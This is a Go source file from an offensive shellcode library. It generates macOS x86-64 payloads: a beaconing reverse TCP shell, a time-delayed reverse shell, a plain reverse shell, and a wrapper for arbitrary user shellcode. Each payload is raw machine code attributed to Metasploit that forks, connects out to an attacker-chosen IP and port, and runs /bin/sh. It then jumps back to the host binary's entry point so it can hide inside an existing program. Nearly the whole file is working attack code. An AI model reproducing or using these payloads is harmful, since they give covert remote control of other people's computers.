package modules

import "github.com/awgh/shellcode/api"

func init() {
	api.RegisterShellCode(api.Darwin, api.Intel, api.Bits64,
		"beaconing_reverse_shell_tcp", beaconing_reverse_shell_tcp_darwin_intel_64)
	api.RegisterShellCode(api.Darwin, api.Intel, api.Bits64,
		"delay_reverse_tcp_shell", delay_reverse_tcp_shell_darwin_intel_64)
	api.RegisterShellCode(api.Darwin, api.Intel, api.Bits64,
		"reverse_tcp_shell", reverse_tcp_shell_darwin_intel_64)
	api.RegisterShellCode(api.Darwin, api.Intel, api.Bits64,
		"user_shellcode", user_shellcode_darwin_intel_64)
}

func beaconing_reverse_shell_tcp_darwin_intel_64(params api.Parameters) ([]byte, error) {

	port := params.Port
	entry := params.Entry
	beacon := uint32(0x0)
	ip := params.Ip

	//From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
	shellcode2 := "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2" // FORK
	//fork
	shellcode2 += "\x0f\x84" // TO TIME CHECK
	shellcode2 += "\x6c\x00\x00\x00"
	shellcode2 += "\xb8" +
		"\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49" +
		"\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe" +
		"\x00\x02"
	if ps, err := api.PackPort(port); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += api.PackIP(ip)
	shellcode2 += "\x56\x48\x89\xe6\x6a\x10\x5a\x0f" +
		"\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a" +
		"\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02" +
		"\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c" +
		"\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"

	//TIME CHECK

	shellcode2 += "\xB8\x74\x00\x00\x02\x0f\x05" // put system time in rax
	shellcode2 += "\x48\x05"
	if as, err := api.PackUint32(beacon); err == nil { // add rax, 15  for seconds
		shellcode2 += as
	} else {
		return nil, err
	}
	shellcode2 += "\x48\x89\xC3" + // mov rbx, rax
		"\xB8\x74\x00\x00\x02\x0f\x05" + // put system time in rax
		"\x48\x39\xD8" + // cmp rax, rbx
		"\x0F\x85\xf0\xff\xff\xff" + // jne back to system time
		"\xe9\x60\xff\xff\xff\xff" // jmp back to FORK

	shellcode1 := "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2" // FORK()
	shellcode1 += "\x0f\x84"                             // \x4c\x03\x00\x00"  // <-- Points to LC_MAIN/LC_UNIXTREADS offset

	if int(entry) < 0 {
		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	} else {
		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	}
	return []byte(shellcode1 + shellcode2), nil
}

func delay_reverse_tcp_shell_darwin_intel_64(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	beacon := uint32(0x0)
	ip := params.Ip

	//From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
	shellcode2 := "\xB8\x74\x00\x00\x02\x0f\x05" // put system time in rax
	shellcode2 += "\x48\x05"
	if as, err := api.PackUint32(beacon); err == nil { // add rax, 15  for seconds
		shellcode2 += as
	} else {
		return nil, err
	}
	shellcode2 += "\x48\x89\xC3" + // mov rbx, rax
		"\xB8\x74\x00\x00\x02\x0f\x05" + // put system time in rax
		"\x48\x39\xD8" + // cmp rax, rbx
		"\x0F\x85\xf0\xff\xff\xff" // jne back to system time

	shellcode2 += "\xb8" +
		"\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49" +
		"\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe" +
		"\x00\x02"

	if ps, err := api.PackPort(port); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += api.PackIP(ip)
	shellcode2 += "\x56\x48\x89\xe6\x6a\x10\x5a\x0f" +
		"\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a" +
		"\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02" +
		"\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c" +
		"\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"

	shellcode1 := "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2" // FORK()
	shellcode1 += "\x0f\x84"                             // \x4c\x03\x00\x00"  // <-- Points to LC_MAIN/LC_UNIXTREADS offset
	if int(entry) < 0 {
		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	} else {
		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	}
	return []byte(shellcode1 + shellcode2), nil
}

func reverse_tcp_shell_darwin_intel_64(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	ip := params.Ip

	//From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
	shellcode2 := "\xb8" +
		"\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49" +
		"\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe" +
		"\x00\x02"

	if ps, err := api.PackPort(port); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += api.PackIP(ip)
	shellcode2 += "\x56\x48\x89\xe6\x6a\x10\x5a\x0f" +
		"\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a" +
		"\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02" +
		"\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c" +
		"\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"

	shellcode1 := "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2" // FORK()
	shellcode1 += "\x0f\x84"                             // \x4c\x03\x00\x00"  // <-- Points to LC_MAIN/LC_UNIXTREADS offset
	if int(entry) < 0 {
		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	} else {
		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	}
	return []byte(shellcode1 + shellcode2), nil
}

func user_shellcode_darwin_intel_64(params api.Parameters) ([]byte, error) {
	entry := params.Entry
	supplied_shellcode := params.ShellCode

	//From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
	shellcode1 := "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2" // FORK()
	shellcode1 += "\x0f\x84"                             // \x4c\x03\x00\x00"  // <-- Points to LC_MAIN/LC_UNIXTREADS offset
	if int(entry) < 0 {
		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	} else {
		if as, err := api.PackUint32(uint32(len(supplied_shellcode)) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	}

	//SHELLCODE
	shellcode1 += string(supplied_shellcode)

	return []byte(shellcode1), nil
}
